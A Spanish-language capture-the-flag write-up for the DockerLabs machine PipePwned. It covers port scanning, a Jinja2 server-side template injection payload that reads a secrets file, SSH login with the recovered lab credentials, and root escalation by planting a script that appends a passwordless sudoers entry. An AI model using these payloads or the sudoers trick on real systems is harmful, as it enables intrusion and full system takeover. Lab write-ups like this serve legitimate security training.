# PipePwned-DockerLabs🇪🇸

## 1 Encender laboratorio.

#### 1.0 Primero vamos a desempaquetar el archivo comprimido y lanzar el laboratorio.
```bash
unzip pipepwned.zip 
bash ./auto_deploy.sh pipepwned.tar 
```

<img width="963" height="466" alt="image" src="https://github.com/user-attachments/assets/810cf839-ad20-46cd-b6d6-4cc5b056439f" />


#### 1.2 Realizamos un ping para comprobar el estado de la máquina.
```bash
ping -c3 172.17.0.2
```

<img width="970" height="227" alt="image" src="https://github.com/user-attachments/assets/3598c427-caae-4546-b838-3dee305e9c61" />


## 2. Reconocimiento.

#### 2.0 Realizamos un escaneo de puertos mediante nmap.
```bash
nmap -p- -sCV 172.17.0.2
```

<img width="958" height="370" alt="image" src="https://github.com/user-attachments/assets/b570cc42-35e3-4f9c-b21a-40a9bf2faff9" />

`estan abiertos los puertos 22(ssh) y 80(http).`


#### 2.1 Realizamos un gobuster para ver los directorios ocultos.
```bash
gobuster dir -u http://172.17.0.2/ \
                         -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
                         -x php,txt,bak \
                         -r \

```

<img width="952" height="443" alt="image" src="https://github.com/user-attachments/assets/0dd68724-b079-41f6-9dd0-7c7c356529d7" />


## 3. Análisis de vulnerabilidades

#### 3.0 Primero miramos en `http:172.17.0.2/ health` .
```bash
 curl -I http://172.17.0.2/health
```

<img width="966" height="224" alt="image" src="https://github.com/user-attachments/assets/fbea8e5e-6f11-40f4-a774-c7da02746a48" />

`No logramos nada importante porque solo es un html con un texto que dice ok`


#### 3.1 En el payments-api encontramos un token de sesión.
`CI_RUNNER_TOKEN=glrt-9ef2bb338750bea3f20e`

<img width="957" height="346" alt="image" src="https://github.com/user-attachments/assets/2cde8b35-f11d-4125-bf28-a19a3e1ddef5" />


#### 3.2 Mediante burp encontramos todos los directorios necesarios.

<img width="332" height="474" alt="image" src="https://github.com/user-attachments/assets/e5c7d9d2-d6b0-4468-ad1a-d71db756b6ac" />



## 4. Explotación

#### 4.0 Viendo que en /pipelines/new que conseguimos mediante burpsuite introducimos un simple script como {2*2} funciona, podremos inyectar un script.

```bash
$ curl -X POST http://172.17.0.2/pipelines/new --data-urlencode 'name={{2*2}}' --data-urlencode 'ref=main'
```

<img width="897" height="550" alt="image" src="https://github.com/user-attachments/assets/b04a395d-7e45-41c0-b6cf-fef230ac9f5f" />


#### 4.1 Procederemos con una inyección de plantillas en el lado del servidor dirigida al motor de plantillas Jinja2 en Python para poder lograr la RCE.
```bash
curl -X POST http://172.17.0.2/pipelines/new --data-urlencode "name={{cycler.__init__.__globals__.os.popen('cat /opt/ci/.env').read()}}" --data-urlencode 'ref=main'
<!DOCTYPE html>
```

<img width="900" height="571" alt="image" src="https://github.com/user-attachments/assets/a4e1c256-5e45-46bb-9340-c98608ab3495" />

`Encontramos : 
DEVOPS_SSH_USER=devops
DEVOPS_SSH_PASS=MAS0ftware_202607!
 `

## 5. Intrusión y escala de privilegios

#### 5. Entramos mediante ssh al tener el user y password.
```bash
 ssh devops@172.17.0.2
# passwd : MAS0ftware_202607!
```

<img width="910" height="404" alt="image" src="https://github.com/user-attachments/assets/cb98ae64-b086-468e-a076-20b2fceff042" />


### User Flag

<img width="409" height="123" alt="image" src="https://github.com/user-attachments/assets/b654f4f1-e90f-44d6-870c-36d17a58cccb" />


#### 5.1 El fichero de configuración siempre es legible por todos los usuarios.
```bash
cat /etc/gitlab-runner/config.toml
```

<img width="904" height="335" alt="image" src="https://github.com/user-attachments/assets/eef086b6-1270-4bb8-9735-c1d02e30fd93" />


#### 5.2 La carpeta está configurada para que cualquier miembro del grupo devops pueda crear y modificar archivos dentro de ella (permisos 2775 con bit SGID). Debido a que un proceso con privilegios elevados (root) ejecuta automáticamente los archivos .sh presentes en ese directorio, cualquier usuario del grupo devops tiene la capacidad de definir qué comandos ejecutará dicho proceso al modificar o agregar un script.
```bash
sudo -i
echo 'echo "devops ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > /opt/ci/builds/pwn.sh
sudo -i
ls
cat root_flag.txt
```

<img width="912" height="179" alt="image" src="https://github.com/user-attachments/assets/a627c959-4cb7-4da5-aefe-fc0c6795c805" />


### Root Flag

<img width="583" height="114" alt="image" src="https://github.com/user-attachments/assets/47b2bb7e-a7ad-4f4f-a6e5-2d4b57ed1f3f" />
